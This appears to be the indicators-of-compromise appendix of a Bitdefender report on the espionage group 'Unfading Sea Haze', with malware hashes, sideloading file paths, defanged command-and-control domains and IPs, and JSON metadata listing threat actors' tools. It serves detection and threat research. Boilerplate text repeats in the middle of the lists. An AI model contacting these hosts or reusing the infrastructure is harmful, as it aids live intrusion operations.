TranslucentGh0st\n\ncf2f7331a04bb9cd47b58a5c80d4c242 EtherealGh0st\n\n3d87f0bd243cff931bb463fce1d115e3 EtherealGh0st\n\n98de3eeda1adefec31d3e3f00079dd2d EtherealGh0st\n\nb04d9dba3bc922a33c1408d4fbf80678 Ps2dllLoader\n\n35a307b73849a3d7a7cd603a0c4698f2 SerialPktdoor loader\n\n3d879bc2fb28c5abbcd6e08b6e5dc762 InsidiousGh0st\n\n7aba74bfbf5cb068fb52e8813c40f4cd Xkeylog keylogger\n\n510c36c9061778d166e23177a191df35 EtherealGh0st\n\nb6cd3d88a6d6886718b6113147a99901 Malicious C# script\n\n1179f589791c2eaa1ae33f38e62753d0 Malicious C# script\n\n0b744f9d38e125cd4fe14289272ac0e2 InsidiousGh0st\n\n960a964cab127c4f3c726612fdeaeb08 EtherealGh0st\n\n1d2185c956a75a8628e310a38dea4001 InsidiousGh0st\n\n7169179cc18e6aa6c2c36e4bee59f63d EtherealGh0st\n\n\n-----\n\n96a43d13fd11464e9898af98cc5bb24b Xkeylog keylogger\n\n14a88779c7e03ecfc19dd18221e25105 EtherealGh0st\n\n2bf96bd44942ca8beed04623a1e19e24 Hid.dll loader\n\nfabdf1094b49673bc0f015cbb986bad5 Hid.dll loader\n\n00bcbeb6ffdadc50a931212eff424e19 EtherealGh0st\n\ne5fc13c39dd81e6de11d1c211f4413ba Xkeylog keylogger\n\n9425f9f7cc393c492deb267c12d031c5 Hid Dropper\n\n551bda0f19bf2705f5f7bd52dcbc021f EtherealGh0st\n\n654163ab9002bd06f68a9f41123b1cd4 EtherealGh0st\n\nfda22f52f0d3a81f095a00810a3dd70a EtherealGh0st\n\ncf5f2e3e1ce82e75a2d0885af5efa1ef EtherealGh0st\n\n3631001b60bdf712e6294d40ec777d87 EtherealGh0st\n\n4e470ea6d7d7da6dd4147c8e948df7c8 InsidiousGh0st\n\n73daf06fed93d542af04d59a4545fab0 FluffyGh0st\n\n100c461d79471c96eba20c8eae35c5ba FluffyGh0st\n\n40466fd795360ac4270751d8c4500c39 EtherealGh0st\n\ncb9e6fa194b8fa2ef5b6b19e0bd6873e EtherealGh0st\n\naf215f4670ae190e699c27e5205aadee Eventlog info extractor\n\n39d43f21b3c2b9f94165f5257b229fb4 EtherealGh0st\n\n3dc8d8a70cc60a2376ce5c555d242cf3 EtherealGh0st\n\n6f01bed0b875069ec5b9650e6d8c416f EtherealGh0st\n\n5f8f9269bcd52ef630bc563b83059b77 FluffyGh0st\n\nfa93aec0018c5e3d1d58b76af159bb82 FluffyGh0st\n\n846838327cda19b4415afd5b352c95df EtherealGh0st\n\n17303b1a254abb9ed0795f7d9b51b462 FluffyGh0st\n\n3decde2a91f52255dd97eaafc2666947 FluffyGh0st\n\nb98e54d01a094bb6b83eff06a8cf49d6 EtherealGh0st\n\nb1a886f8904d90ad28fce0dc0dc9df93 Ps2dllLoader\n\n5800fff782c36df785dad1d0a34ad418 Ps2dllLoader\n\n4b68c803db1b4222292adba3b2a1a037 EtherealGh0st\n\n6c49738668ca7c054f0708ecc3b626c8 SerialPktDoor loader\n\nd9a452c1c06903fafa4dc4625b2c2d9b EtherealGh0st\n\n91017ad856cff5f0cb304ea2a3ae81c9 FluffyGh0st\n\nf54bed43b372997f3bafe5c67c799e73 InsidiousGh0st\n\ncd0b810751eb2a1470e44f7f6660d5f4 InsidiousGh0st\n\n80fb9865209f8d8d1017c8151c79ef74 Network scanner\n\nc8c890cf8d61cab805e9ef0a4471579a EtherealGh0st\n\n0f4d06cedc93c7784580a3a7c4ad2fb4 InsidiousGh0st\n\nc182b3e659a416fe59f3613c08a8cff InsidiousGh0st go variant\n\n942086934f4dd65c3e0158c9b8d89933 SharpZulip\n\n124bdaaa70da4daeacbc0513b6c0558e\n\n### File paths\n\nc:\\program files\\videolan\\vlc\\msftedit.dll\n\nc:\\programdata\\adobe\\arm\\arm.dll\n\nc:\\programdata\\coint.dll\n\nc:\\programdata\\epson\\setup\\msftedit.dll\n\nc:\\programdata\\microsoft\\devicesync\\msftedit.dll\n\n\n-----\n\nc:\\programdata\\microsoft\\servermanager\\events\\msftedit.dll\n\nc:\\programdata\\microsoft\\windows\\clipsvc\\genuineticket\\msftedit.dll\n\nc:\\programdata\\microsoft\\windows\\clipsvc\\msftedit.dll\n\nc:\\programdata\\mscorsvc.dll\n\nc:\\programdata\\mscorsvw.exe\n\nc:\\programdata\\prod.dll\n\nc:\\programdata\\server.dll\n\nc:\\programdata\\ssh\\msftedit.dll\n\nc:\\programdata\\ssh\\setup.exe\n\nc:\\programdata\\ssh\\ssh.sys\n\nc:\\programdata\\stub.ps1\n\nc:\\programdata\\usoshared\\log.dll\n\nc:\\programdata\\usoshared\\logs\\mscorsvc.dll\n\nc:\\programdata\\usoshared\\uso.dll\n\nc:\\programdata\\winsync.dll\n\nc:\\python27\\mscorsvc.dll\n\nc:\\users\\<user>\\appdata\\local\\adobe\\acrobat\\mscorsvc.dll\n\nc:\\users\\<user>\\appdata\\local\\comms\\msftedit.dll\n\nc:\\users\\<user>\\appdata\\local\\microsoft\\windows\\caches\\cversions.db\n\nc:\\users\\<user>\\appdata\\local\\temp\\microsoftupdate.log\n\nc:\\users\\<user>\\appdata\\roaming\\adobe\\mscorsvc.dll\n\nc:\\users\\<user>\\appdata\\roaming\\brother\\mscorsvc.dll\n\nc:\\users\\<user>\\appdata\\roaming\\microsoft\\mscorsvc.dll\n\nc:\\users\\<user>\\appdata\\roaming\\mscorsvc.dll\n\nc:\\users\\<user>\\desktop\\dbghelp.dll\n\nc:\\users\\<user>\\desktop\\gro.dll\n\nc:\\users\\<user>\\desktop\\m.dll\n\nc:\\users\\<user>\\desktop\\mscorsvc.dll\n\nc:\\users\\<user>\\desktop\\mscorsvw.exe\n\nc:\\users\\<user>\\desktop\\msftedit.dll\n\nc:\\users\\<user>\\desktop\\s.dll\n\nc:\\users\\<user>\\desktop\\servicemove64.exe\n\nc:\\users\\<user>\\desktop\\sls\n\nc:\\users\\<user>\\desktop\\sur.dll\n\nc:\\users\\<user>\\desktop\\wh.exe\n\nc:\\users\\<user>\\desktop\\yh.exe\n\nc:\\users\\<user>\\downloads\\rea.dll\n\nc:\\users\\public\\downloads\\data.dll\n\nc:\\users\\public\\downloads\\mscorsvc.dll\n\nc:\\users\\public\\downloads\\notea.exe\n\nc:\\windows\\addins\\mscorsvc.dll\n\nc:\\windows\\cursors\\curs.cur\n\nc:\\windows\\debug\\wia\\vpn_bridge.config\n\nc:\\windows\\help\\help\\mscorsvc.dll\n\nc:\\windows\\help\\mscorsvc.dll\n\nc:\\windows\\ime\\server.dll\n\nc:\\windows\\livekernelreports\\mscorsvc.dll\n\nc:\\windows\\mscorsvc.dll\n\nc:\\windows\\policydefinitions\\mscorsvc.dll\n\n\n-----\n\nc:\\windows\\setup\\cert.dll\n\nc:\\windows\\setup\\mscorsvc.dll\n\n\nc:\\windows\\system32\\dsc\\msftedit.dll\n\nc:\\windows\\system32\\grouppolicy\\datastore\\0\\sysvol\\<domain>\\policies\\{31b2f340-016d11d2-945f-00c04fb984f9}\\machine\\applications.dll\n\n\nc:\\windows\\system32\\mscorsvc.dll\n\nc:\\windows\\system32\\perceptionsimulation\\hid.dll\n\n\nc:\\windows\\system32\\perceptionsimulation\\hidserv.dll\n\nc:\\windows\\systemtemp\\mscorsvc.dll\n\n\nc:\\windows\\systemtemp\\winsat\\mscorsvc.dll\n\nem_nqiy9yrk_installer.msi\n\n\nrecorded.log\n\n\n### Domain names\n\nupupdate.ooguy[.]com\n\n\nfc.adswt[.]com\n\nmail.simpletra[.]com\n\n\nmail.adswt[.]com\n\napi.simpletra[.]com\n\n\nbit.kozow[.]com\n\nbitdefenderupdate[.]org\n\n\nauth.bitdefenderupdate[.]com\n\nmail.pcygphil[.]com\n\n\nmail.bomloginset[.]com\n\ndns-log.d-n-s.org[.]uk\n\nlinklab.blinklab[.]com\n\nlink.theworkguyoo[.]com\n\nmail.theworkguyoo[.]com\n\n\nsopho.kozow[.]com\n\nnews.nevuer[.]com\n\npayroll.mywire[.]org\n\n\nemployee.mywire[.]org\n\nairst.giize[.]com\n\n\ncdn.g8z[.]net\n\nmanags.twilightparadox[.]com\n\n\ndns.g8z[.]net\n\nmessage.ooguy[.]com\n\n\nspcg.lunaticfridge[.]com\n\nhelpdesk.fxnxs[.]com\n\n\nnewy.hifiliving[.]com\n\nimages.emldn[.]com\n\n\nword.emldn[.]com\n\nprovider.giize[.]com\n\n\nrest.redirectme[.]net\n\n\n###### api.bitdefenderupdate[.]org\n\nBitdefender is a cybersecurity leader delivering best-in-class threat prevention, detection, and response solutions worldwide. Guardian\nover millions of consumer, business, and government environments, Bitdefender is one of the industry’s most trusted experts for\neliminating threats, protecting privacy and data, and enabling cyber resilience. With deep investments in research and development,\nBitdefender Labs discovers over 400 new threats each minute and validates around 40 billion daily threat queries. The company has\npioneered breakthrough innovations in antimalware IoT security behavioral analytics and artificial intelligence and its technology is\n\n\nRomania HQ\nOrhideea Towers\n15A Orhideelor Road,\n6th District,\nBucharest 060071\n\n\nUS HQ\n3945 Freedom Circle,\nSuite 500, Santa Clara,\nCA, 95054\n\n\n-----\n\n### IP addresses\n\n167.71.199[.]105\n\n\n188.166.224[.]242\n\n159.223.78[.]147\n\n\n128.199.166[.]143\n\n164.92.146[.]227\n\n\n192.153.57[.]24\n\n209.97.167[.]177\n\n\n112.113.112[.]5\n\n193.149.129[.]128\n\n\n128.199.66[.]11\n\n45.61.137[.]109\n\n139.59.107[.]49\n\n152.42.198[.]152\n\n\nUS HQ\n3945 Freedom Circle,\nSuite 500, Santa Clara,\nCA, 95054\n\n\nBitdefender is a cybersecurity leader delivering best-in-class threat prevention, detection, and response solutions worldwide. Guardian\nover millions of consumer, business, and government environments, Bitdefender is one of the industry’s most trusted experts for\neliminating threats, protecting privacy and data, and enabling cyber resilience. With deep investments in research and development,\nBitdefender Labs discovers over 400 new threats each minute and validates around 40 billion daily threat queries. The company has\npioneered breakthrough innovations in antimalware IoT security behavioral analytics and artificial intelligence and its technology is\n\n\nRomania HQ\nOrhideea Towers\n15A Orhideelor Road,\n6th District,\nBucharest 060071\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        }
    ],
    "references": [
        "https://blogapp.bitdefender.com/labs/content/files/2024/05/Bitdefender-Report-DeepDive-creat7721-en_EN.pdf"
    ],
    "report_names": [
        "Bitdefender-Report-DeepDive-creat7721-en_EN.pdf"
    ],
    "threat_actors": [
        {
            "id": "cd48e0e6-b206-478d-bcb4-198be54bdf7a",
            "created_at": "2024-06-07T02:00:04.002734Z",
            "updated_at": "2025-03-27T02:00:03.37408Z",
            "deleted_at": null,
            "main_name": "Unfading Sea Haze",
            "aliases": [],
            "source_name": "MISPGALAXY:Unfading Sea Haze",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f51de4ba-d3f5-4df7-ab5a-034b32584e48",
            "created_at": "2024-06-20T02:02:10.208158Z",
            "updated_at": "2025-03-27T02:02:10.196051Z",
            "deleted_at": null,
            "main_name": "Unfading Sea Haze",
            "aliases": [],
            "source_name": "ETDA:Unfading Sea Haze",
            "tools": [
                "DustyExfilTool",
                "EtherealGh0st",
                "FluffyGh0st",
                "InsidiousGh0st",
                "Ps2dllLoader",
                "SerialPktdoor",
                "SharpJSHandler",
                "SharpZulip",
                "SilentGh0st",
                "Stubbedoor",
                "TranslucentGh0st",
                "xkeylog"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1718849044,
    "ts_updated_at": 1743041776,
    "ts_creation_date": 1714386939,
    "ts_modification_date": 1714386941,
    "files": {
        "pdf": "https://archive.orkl.eu/1806c2cb3e5594b6e1847526298141fd73339ff2.pdf",
        "text": "https://archive.orkl.eu/1806c2cb3e5594b6e1847526298141fd73339ff2.txt",
        "img": "https://archive.orkl.eu/1806c2cb3e5594b6e1847526298141fd73339ff2.jpg"
    }
}